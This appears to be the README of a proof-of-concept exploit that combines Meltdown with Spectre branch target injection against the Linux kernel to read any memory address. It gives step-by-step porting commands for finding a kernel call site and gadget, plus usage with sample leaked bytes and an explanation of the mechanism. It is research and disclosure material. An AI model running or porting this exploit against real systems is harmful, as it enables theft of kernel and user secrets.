# A Meltdown + Spectre PoC that allows reading un-cached memory

This PoC combines Meltdown together with a Branch Target Injection (BTI, Spectre variant 2) in order to read any virtual memory address on the system (cached or un-cached).

The BTI is done into the running kernel, causing it to speculatively access any memory address that we'd like. This speculative access places the targeted data into the L1 cache. At that point it's easy to read the memory out using Meltdown, as described in the Meltdown whitepaper. 

# Limitations

1. This is for Linux only. Porting the same concept to other OSs should be trivial.
2. There is no regard here for KASLR. However, other tools exist (as part of other Meltdown PoCs) that do this.
3. You need to get a copy of the running kernel image and symbols.

This was tested on the following CPUs:

1. Intel Core i7-6500U
2. Intel Core i7-5500U

# Porting

This PoC has to be ported to your running kernel.
We need to obtain the kernel image. On my Ubuntu running a mainline kernel, I did something like:

    $ dpkg -S /boot/vmlinuz-`uname -r`
    linux-image-4.12.14-041214-generic: /boot/vmlinuz-4.12.14-041214-generic

Then obtain the deb file from http://kernel.ubuntu.com/~kernel-ppa/mainline/. Extract it uisng dpkg-deb.
Alternatively, let's cheat and just get it as root from:

    $ sudo cp /boot/System.map-`uname -r` .
    $ sudo cp /boot/vmlinuz-`uname -r` .
    $ sudo chmod ugo+x vmlinuz-* System.map-*
    
Extract vmlinuz:

    $ wget -O extract-vmlinux https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux && chmod +x extract-vmlinux
    $ ./extract-vmlinux vmlinuz-* > vmlinux
    
Now find the symbol of the function that contains the indirect call we're going to attack with BTI:

    $ grep security_file_fcntl System.map-*
    ffffffff8138fcb0 T security_file_fcntl
    
Using this address, find the target callq in the function.

    $ objdump -d vmlinux | grep 'ffffffff8138fcb0:' -A 30 | grep 'callq.*\*' -A 1 | head -n2
    ffffffff8138fcf0:       ff 53 18                callq  *0x18(%rbx)
    ffffffff8138fcf3:       85 c0                   test   %eax,%eax
    
Additionally, find a gadget close by that derefs %rdx

    $ objdump -d vmlinux | grep 'ffffffff8138fcb0:' -A 20000 | grep 'mov[^,]*(%rdx' | head -n1
    ffffffff81392126:       48 8b 02                mov    (%rdx),%rax

These are the addresses needed to port the exploit. In this case, set the value CALL_ADDR_NEXT_INST to 0xffffffff8138fcf3 (this is the addr of the instruction *after* the call), and GADGET_ADDR to 0xffffffff81392126. These constants are in doit.c

At last, we'll cheat (due to no KASLR bypass) to retrieve the ASLR base

    $ sudo cat /proc/kallsyms | grep _stext
    ffffffff92a00000 T _stext
    
# Usage
    ./build.sh  
    tasket 0x1 ./doit <aslr_base> <virt_addr> <len>
  
    $ taskset 0x1 ./doit 0xffffffff92a00000 0xffffffff92c47cc0 0x20
    0f 1f 44 00 00 55 48 89 e5 41 56 41 55 41 54 53
    49 89 f5 49 89 d6 48 83 ec 18 65 48 8b 04 25 28

# How this works
Fist of all, this PoC implements the basic version of Meltdown, from the Meltdown whitepaper. However this attack is limited to only reading data from the L1D cache (as explained by Google Project Zero). To overcome this limitation, this PoC uses an additional Spectre BTI attack against the kernel.

The attacked indirect call in the kernel is located in security/security.c:

    int security_file_fcntl(struct file *file, unsigned int cmd, unsigned long arg)
    {
    	return security_ops->file_fcntl(file, cmd, arg);
    }
    
Here, if security_ops points to un-cached memory, the indirect call will be guessed by the CPU (as explained in the Spectre writeups). It's easy to reach this code via the fcntl() syscall.

The attacker controls the *arg* param in this call via the syscall API. The *arg* param will be passed on the %rdx register (per the x86_64 ABI). If *arg* is set to be a pointer, and the BTI causes the indirect call to speculatively execute a gadget that derefs %rdx, the memory *arg* points to will then become cached.

After that the regular Meltdown attack can read the memory.
